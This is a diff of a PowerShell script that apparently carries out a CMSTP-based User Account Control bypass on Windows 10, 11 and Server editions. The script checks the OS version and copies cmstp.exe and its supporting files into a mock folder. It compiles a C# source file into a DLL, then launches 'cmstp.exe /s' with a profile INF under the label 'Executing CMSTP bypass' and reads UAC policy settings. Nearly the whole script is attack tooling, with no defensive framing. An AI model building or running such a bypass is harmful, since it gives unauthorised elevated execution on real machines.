@@ -34,35 +34,17 @@ $OSVersion = (Get-ItemProperty -Path "HKLM:\SOFTWARE\Microsoft\Windows NT\Curren
 $supportedVersions = @(
     "Windows 10 Home",
     "Windows 10 Pro",
-    "Windows 10 Education",
     "Windows 10 Enterprise",
-    "Windows 10 Enterprise 2015",
-    "Windows 10 Mobile and Mobile Enterprise",
-    "Windows 10 IoT Core",
-    "Windows 10 IoT Enterprise LTSC 2021",
-    "Windows 10 IoT Mobile Enterprise",
     "Windows Server 2019 Standard",
-    "Windows Server 2019 Datacenter",
-    "Windows Server 2019 Essentials",
-    "Windows Server 2019 Azure Core",
     "Windows Server 2022 Standard",
-    "Windows Server 2022 Datacenter",
-    "Windows Server 2022 Azure Core",
-    "Windows 11 Home",
-    "Windows 11 Pro",
-    "Windows 11 Education",
-    "Windows 11 Enterprise",
-    "Windows 11 IoT Enterprise",
-    "Windows 11 IoT Mobile Enterprise",
-    "Windows 11 Team",
-    "Windows 11 Enterprise Multi-session"
+    "Windows 11 Pro"
 )
 
 if ($supportedVersions -notcontains $OSVersion) {
     Write-Host "Unsupported OS version: $OSVersion"
     exit
 } else {
-    Write-Host " Running on supported OS: $OSVersion"
+    Write-Host "Running on supported OS: $OSVersion"
 }
 
 # Create a mock folder
@@ -72,8 +54,28 @@ if (-not (Test-Path $mockFolderPath)) {
     Write-Host "Mock folder created at $mockFolderPath."
 }
 
+# Check if cmstp.exe is available
+$cmstpPath = "$env:SystemRoot\System32\cmstp.exe"
+if (-not (Test-Path $cmstpPath)) {
+    Write-Host "cmstp.exe not found. Copying files to MockFolder..."
+
+    # Path to source files
+    $sourceFolder = "C:\cmstp\files"
+    $filesToCopy = @("cmstp.exe", "cmstp.dll", "cmstp.inf", "cmstp.exe.mui")
+
+    # Copy files to MockFolder
+    foreach ($file in $filesToCopy) {
+        $sourceFile = Join-Path -Path $sourceFolder -ChildPath $file
+        $destinationFile = Join-Path -Path $mockFolderPath -ChildPath $file
+        Copy-Item -Path $sourceFile -Destination $destinationFile -Force
+        Write-Host "Copied $file to $mockFolderPath."
+    }
+} else {
+    Write-Host "cmstp.exe is already installed at $cmstpPath."
+}
+
 # Compiling DLLs
-Write-Host " Compiling DLL files..."
+Write-Host "Compiling DLL files..."
 Add-Type -TypeDefinition ([IO.File]::ReadAllText("$pwd\sl0puacb.cs")) -ReferencedAssemblies "System.Windows.Forms" -OutputAssembly "$mockFolderPath\sl0p.dll"
 Write-Host "DLL files created."
 
@@ -98,7 +100,7 @@ if (-not $currentUser.IsInRole([Security.Principal.WindowsBuiltInRole]::Administ
     exit
 }
 
-# Call CMSTP Bypass if applicable
+# Execute CMSTP Bypass
 if ($OSVersion -match "Windows 10|Windows 11|Windows Server 2019|Windows Server 2022") {
     Write-Host "Executing CMSTP bypass..."
     Start-Process "cmstp.exe" -ArgumentList "/s", "C:\Path\To\Your\CMSTPProfile.inf"
@@ -115,3 +117,4 @@ Write-Host "Getting LUA Settings..."
 Get-ItemProperty HKLM:Software\Microsoft\Windows\CurrentVersion\policies\system
 
 Write-Host "________________________"
+
